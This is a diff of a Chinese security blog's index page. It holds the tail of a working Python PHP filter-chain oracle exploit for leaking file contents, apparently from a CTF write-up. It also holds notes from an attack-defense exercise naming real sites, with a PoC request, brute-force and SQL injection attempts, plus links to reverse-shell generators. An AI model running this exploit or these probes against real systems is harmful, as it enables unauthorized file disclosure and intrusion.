+          elif req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;I&#39;
+          else:
+              err(&#39;something wrong&#39;)
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # v w x
+          if req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;x&#39;
+          elif req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;w&#39;
+          elif req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;v&#39;
+          else:
+              err(&#39;something wrong&#39;)
+      elif not req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # V W X
+          if req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;X&#39;
+          elif req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;W&#39;
+          elif req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
+              return &#39;V&#39;
+          else:
+              err(&#39;something wrong&#39;)
+      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # Z
+          return &#39;Z&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # z
+          return &#39;z&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # M
+          return &#39;M&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # m
+          return &#39;m&#39;
+      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # y
+          return &#39;y&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # Y
+          return &#39;Y&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # l
+          return &#39;l&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # L
+          return &#39;L&#39;
+      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # h
+          return &#39;h&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # H
+          return &#39;H&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # u
+          return &#39;u&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # U
+          return &#39;U&#39;
+      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # g
+          return &#39;g&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # G
+          return &#39;G&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # t
+          return &#39;t&#39;
+      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
+          # T
+          return &#39;T&#39;
+      else:
+          err(&#39;something wrong&#39;)
+  
+  print()
+  for i in range(100):
+      prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;&#39;
+      letter = find_letter(prefix)
+      # it&#39;s a number! check base64
+      if letter == &#39;*&#39;:
+          prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode&#39;
+          s = find_letter(prefix)
+          if s == &#39;M&#39;:
+              # 0 - 3
+              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
+              ss = find_letter(prefix)
+              if ss in &#39;CDEFGH&#39;:
+                  letter = &#39;0&#39;
+              elif ss in &#39;STUVWX&#39;:
+                  letter = &#39;1&#39;
+              elif ss in &#39;ijklmn&#39;:
+                  letter = &#39;2&#39;
+              elif ss in &#39;yz*&#39;:
+                  letter = &#39;3&#39;
+              else:
+                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
+          elif s == &#39;N&#39;:
+              # 4 - 7
+              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
+              ss = find_letter(prefix)
+              if ss in &#39;CDEFGH&#39;:
+                  letter = &#39;4&#39;
+              elif ss in &#39;STUVWX&#39;:
+                  letter = &#39;5&#39;
+              elif ss in &#39;ijklmn&#39;:
+                  letter = &#39;6&#39;
+              elif ss in &#39;yz*&#39;:
+                  letter = &#39;7&#39;
+              else:
+                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
+          elif s == &#39;O&#39;:
+              # 8 - 9
+              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
+              ss = find_letter(prefix)
+              if ss in &#39;CDEFGH&#39;:
+                  letter = &#39;8&#39;
+              elif ss in &#39;STUVWX&#39;:
+                  letter = &#39;9&#39;
+              else:
+                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
+          else:
+              err(&#39;wtf&#39;)
+  
+      print(end=letter)
+      o += letter
+      sys.stdout.flush()
+  
+  &quot;&quot;&quot;
+  We are done!! :)
+  &quot;&quot;&quot;
+  
+  print()
+  d = b64decode(o.encode() + b&#39;=&#39; * 4)
+  # remove KR padding
+  d = d.replace(b&#39;$)C&#39;,b&#39;&#39;)
+  print(b64decode(d))
+</code></pre>
+</li>
+<li><p>  首先，通过构造特定的过滤器链，在HTTP请求中注入不同的字符和过滤器</p>
+</li>
+<li><p>  如果在应用过滤器链后服务器返回500错误，那么可以推断出该字符在flag文件中，因为服务器在某些条件下无法正确处理该输入，从而导致错误</p>
+</li>
+<li><p>  根据服务器的响应，可以逐个判断flag文件中的字符</p>
+</li>
+</ol>
 
-  验证poc
+        </div>
+    
 
-  GET /SearchPet/index.asp HTTP/1.1
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E5%BE%B7%E5%B7%9E%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/">
+                德州攻防演练
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-08-06</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E5%BE%B7%E5%B7%9E%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/实战/">实战</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="德州市公共汽车公司"><a href="#德州市公共汽车公司" class="headerlink" title="德州市公共汽车公司"></a>德州市公共汽车公司</h1><ol>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230806215139.png"></p>
+</li>
+<li><p>  验证poc</p>
+</li>
+<li><pre><code>  GET /SearchPet/index.asp HTTP/1.1
   Host: dzgj.cn
   Cache-Control: max-age=0
   Upgrade-Insecure-Requests: 1
@@ -293,56 +1945,378 @@
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.9
-  Cookie: ASPSESSIONIDQQ ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/" title="通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞">通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-07T06:03:05.348Z" title="发表于 2023-07-07 14:03:05">2023-07-07</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="content">权限图
-水平越权
-  用户信息获取时未对用户与用户ID比较判断直接查询等
-  同级用户权限共享
-  用户A的查看到具有相同权限的用户B才可以查看到的文件
+  Cookie: ASPSESSIONIDQQSBRTCD=CGOBPAJDDFECONCBOJGICDCA; path=/
+  Connection: close
+  
+  
+</code></pre>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230806221146.png"></p>
+</li>
+</ol>
+<h1 id="畅捷通t"><a href="#畅捷通t" class="headerlink" title="畅捷通t+"></a>畅捷通t+</h1><h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><ol>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807090526.png"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807091124.png"></li>
+<li></li>
+</ol>
+<h1 id="夏津"><a href="#夏津" class="headerlink" title="夏津"></a>夏津</h1><h2 id="注册模块未开放"><a href="#注册模块未开放" class="headerlink" title="注册模块未开放"></a>注册模块未开放</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807091831.png"></p>
+<h1 id="齐河县"><a href="#齐河县" class="headerlink" title="齐河县"></a>齐河县</h1><h2 id="注册模块未向后端发送数据包"><a href="#注册模块未向后端发送数据包" class="headerlink" title="注册模块未向后端发送数据包"></a>注册模块未向后端发送数据包</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807154133.png"></p>
+<p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807154111.png"></p>
+<p>前后端之间没有交互</p>
+<p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807155209.png"></p>
+<h1 id="德州线上抵押申请"><a href="#德州线上抵押申请" class="headerlink" title="德州线上抵押申请"></a>德州线上抵押申请</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807160402.png"></p>
+<p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807160420.png"></p>
+<p>有admin用户，尝试弱口令top500爆破没成功</p>
+<p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807160457.png"></p>
+<h1 id="车贷平台-gt-山东微警务"><a href="#车贷平台-gt-山东微警务" class="headerlink" title="车贷平台-&gt;山东微警务"></a>车贷平台-&gt;山东微警务</h1><h2 id="扫后缀发现微警务平台后台登录"><a href="#扫后缀发现微警务平台后台登录" class="headerlink" title="扫后缀发现微警务平台后台登录"></a>扫后缀发现微警务平台后台登录</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807170903.png"></p>
+<p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230807170918.png"></p>
+<p>尝试sql注入没有成功</p>
+<h1 id="权限维持Thinkphp"><a href="#权限维持Thinkphp" class="headerlink" title="权限维持Thinkphp"></a>权限维持Thinkphp</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230808090607.png"></p>
+<p>3.1.3的thinkphp版本</p>
+<h1 id="通达OA"><a href="#通达OA" class="headerlink" title="通达OA"></a>通达OA</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230810152146.png"></p>
 
-修复建议
-  在用户登录时就获取用户的ID值等信息，进行每一次操作时都要比较是否是同一个ID值
-  用户A只能操作用户A及其文件，不能操作其它用户及其文件
+        </div>
+    
 
-实例
-  用某用户登录，抓包（这里是修改用户对应的值）
-  
-  修改对应的值后，forward发出这个包
-  发现成功修改
-  
-  这个案例就是用A用户的权限去进行同权限用户的信息的水平越权漏洞
+</div>
+            
+                
+<div class="post">
 
-垂直越权
-  数据库中用户类型编号接收篡改或高权限操作未验证等
-  低高用户权限共享
-  低权限看到了高权限的东西
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/">
+                通用漏洞&业务逻辑漏洞&水平垂直越权漏洞
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-07-07</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透/">渗透</a>
+                </span>
+            
+        </div>
+    </div>
 
-问题在哪里
-  没有验证 触发当前操作的用户权限
-  有验证 逻辑顺序搞错了
+    
+        <div class="content">
+            <h1 id="权限图"><a href="#权限图" class="headerlink" title="权限图"></a>权限图</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707162615.png"></p>
+<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><ol>
+<li>  <strong>用户信息获取时未对用户与用户ID比较判断直接查询等</strong></li>
+<li>  同级用户权限共享</li>
+<li>  用户A的查看到具有相同权限的用户B才可以查看到的文件</li>
+</ol>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
+<li>  在用户登录时就获取用户的ID值等信息，进行每一次操作时都要比较是否是同一个ID值</li>
+<li>  用户A只能操作用户A及其文件，不能操作其它用户及其文件</li>
+</ol>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ol>
+<li>  用某用户登录，抓包（这里是修改用户对应的值）</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707164610.png"></li>
+<li>  修改对应的值后，forward发出这个包</li>
+<li>  发现成功修改</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707164828.png"></li>
+<li>  这个案例就是用A用户的权限去进行同权限用户的信息的水平越权漏洞</li>
+</ol>
+<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><ol>
+<li>  数据库中用户类型编号接收篡改或高权限操作未验证等</li>
+<li>  低高用户权限共享</li>
+<li>  低权限看到了高权限的东西</li>
+</ol>
+<h3 id="问题在哪里"><a href="#问题在哪里" class="headerlink" title="问题在哪里"></a>问题在哪里</h3><ol>
+<li>  没有验证 触发当前操作的用户权限</li>
+<li>  有验证 逻辑顺序搞错了</li>
+</ol>
+<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><ol>
+<li>  以游客的身份，触发（发送）了管理员的数据包，从而进行了管理员的操作，垂直越权</li>
+<li>  首先，文章管理站有1111文章，并已发布</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171704.png"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171746.png"></li>
+<li>  复制回收操作的链接地址</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171824.png"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171937.png"></li>
+<li>  现在以没有登录的身份，去请求回收的链接地址</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707172038.png"></li>
+<li>  发现文章删除</li>
+</ol>
+<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="验证丢失"><a href="#验证丢失" class="headerlink" title="验证丢失"></a>验证丢失</h2><ol>
+<li>  未包含引用验证代码文件等</li>
+</ol>
+<h2 id="取消验证"><a href="#取消验证" class="headerlink" title="取消验证"></a>取消验证</h2><ol>
+<li>  支持空口令、匿名、白名单等</li>
+</ol>
+<h1 id="脆弱验证-Cookie-amp-Token-amp-Jwt等"><a href="#脆弱验证-Cookie-amp-Token-amp-Jwt等" class="headerlink" title="脆弱验证-Cookie&amp;Token&amp;Jwt等"></a>脆弱验证-Cookie&amp;Token&amp;Jwt等</h1>
+        </div>
+    
 
-实例
-  以游客的身份，触发（发送）了管理员的数据包，从而进行了管理员的操作，垂直越权
-  首先，文章管理站有1111文章，并已发布
-  
-  
-  复制回收操作的链接地址
-  
-  
-  现在以没有登录的身份，去请求回收的链接地址
-  
-  发现文章删除
+</div>
+            
+                
+<div class="post">
 
-访问控制验证丢失
-  未包 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%8F%8D%E5%BC%B9shell_%E7%94%9F%E6%88%90payload/" title="反弹shell_生成payload、各种八股文术语">反弹shell_生成payload、各种八股文术语</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-03T06:08:06.073Z" title="发表于 2023-07-03 14:08:06">2023-07-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/CTF/">CTF</a></span></div><div class="content">在线生成payload网站文件下载命令生成[~]#棱角 ::Edge.Forum* (ywhack.com)
-反弹shell命令生成器反弹shell生成器 (ywhack.com)
-八股文术语渗透测试常用术语总结 - 11阳光 - 博客园 (cnblogs.com)
-</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/#content-inner">12</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h3110w0r1d</div><div class="author-info__description">CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看吧</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023%E5%A4%8D%E7%9B%98/" title="2023复盘">2023复盘</a><time datetime="2024-01-10T16:41:46.332Z" title="发表于 2024-01-11 00:41:46">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/" title="侧信道攻击">侧信道攻击</a><time datetime="2023-09-26T09:03:09.760Z" title="发表于 2023-09-26 17:03:09">2023-09-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" title="蓝帽杯半决赛wp_电子取证部分">蓝帽杯半决赛wp_电子取证部分</a><time datetime="2023-09-16T13:26:55.732Z" title="发表于 2023-09-16 21:26:55">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/" title="蓝帽杯半决赛wp_web部分">蓝帽杯半决赛wp_web部分</a><time datetime="2023-09-16T13:18:03.466Z" title="发表于 2023-09-16 21:18:03">2023-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构">数据结构</a><time datetime="2023-08-30T08:37:08.678Z" title="发表于 2023-08-30 16:37:08">2023-08-30</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
-            <i class="fas fa-folder-open"></i>
-            <span>分类</span>
-            <a class="card-more-btn" href="/categories/" title="查看更多">
-    <i class="fas fa-angle-right"></i></a>
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E5%8F%8D%E5%BC%B9shell_%E7%94%9F%E6%88%90payload/">
+                反弹shell_生成payload、各种八股文术语
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-07-03</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E5%8F%8D%E5%BC%B9shell_%E7%94%9F%E6%88%90payload/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透/">渗透</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="在线生成payload网站"><a href="#在线生成payload网站" class="headerlink" title="在线生成payload网站"></a>在线生成payload网站</h1><h2 id="文件下载命令生成"><a href="#文件下载命令生成" class="headerlink" title="文件下载命令生成"></a>文件下载命令生成</h2><p>[<a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">~]#棱角 ::Edge.Forum* (ywhack.com)</a></p>
+<h2 id="反弹shell命令生成器"><a href="#反弹shell命令生成器" class="headerlink" title="反弹shell命令生成器"></a>反弹shell命令生成器</h2><p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/reverse-shell/">反弹shell生成器 (ywhack.com)</a></p>
+<h1 id="八股文术语"><a href="#八股文术语" class="headerlink" title="八股文术语"></a>八股文术语</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sunny11/p/13583083.html">渗透测试常用术语总结 - 11阳光 - 博客园 (cnblogs.com)</a></p>
+
+        </div>
+    
+
+</div>
+            
+        </section>
+    </div>
+</div>
+
+
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
             </div>
-            <ul class="card-category-list" id="aside-cat-list">
-            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/"><span class="card-category-list-name">CSS</span><span class="card-category-list-count">1</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CSS/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">40</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ing/"><span class="card-category-list-name">ing</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/linux/"><span class="card-category-list-name">linux</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/ping/"><span class="card-category-list-name">ping</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">sql注入</span><span class="card-category-list-count">2</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/sql%E6%B3%A8%E5%85%A5/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">手动注入</span><span class="card-category-list-count">1</span></a></li></ul></li></ul></li>
-            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/mysql/" style="font-size: 1.1em; color: #999">mysql</a> <a href="/tags/awd/" style="font-size: 1.1em; color: #999">awd</a> <a href="/tags/%E5%88%86%E7%9B%98/" style="font-size: 1.1em; color: #999">分盘</a> <a href="/tags/%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">网站备份漏洞</a> <a href="/tags/Java/" style="font-size: 1.16em; color: #999b9e">Java</a> <a href="/tags/Javaweb/" style="font-size: 1.1em; color: #999">Javaweb</a> <a href="/tags/acm%E7%AE%97%E6%B3%95/" style="font-size: 1.21em; color: #999ea4">acm算法</a> <a href="/tags/linux/" style="font-size: 1.39em; color: #99a4b4">linux</a> <a href="/tags/HTML/" style="font-size: 1.16em; color: #999b9e">HTML</a> <a href="/tags/hive/" style="font-size: 1.1em; color: #999">hive</a> <a href="/tags/hadoop/" style="font-size: 1.21em; color: #999ea4">hadoop</a> <a href="/tags/ping/" style="font-size: 1.1em; color: #999">ping</a> <a href="/tags/ing/" style="font-size: 1.44em; color: #99a7ba">ing</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1.1em; color: #999">远程登录服务器</a> <a href="/tags/CTF/" style="font-size: 1.5em; color: #99a9bf">CTF</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.33em; color: #99a2af">渗透</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/" style="font-size: 1.1em; color: #999">数据可视化</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D/" style="font-size: 1.21em; color: #999ea4">文件修复</a> <a href="/tags/goweb/" style="font-size: 1.1em; color: #999">goweb</a> <a href="/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/" style="font-size: 1.1em; color: #999">手动注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 1.1em; color: #999">数据结构</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.1em; color: #999">实战</a> <a href="/tags/go/" style="font-size: 1.27em; color: #99a0a9">go</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.39em; color: #99a4b4">数据库</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/" style="font-size: 1.1em; color: #999">脚本小子</a> <a href="/tags/ssh/" style="font-size: 1.1em; color: #999">ssh</a> <a href="/tags/web/" style="font-size: 1.27em; color: #99a0a9">web</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: 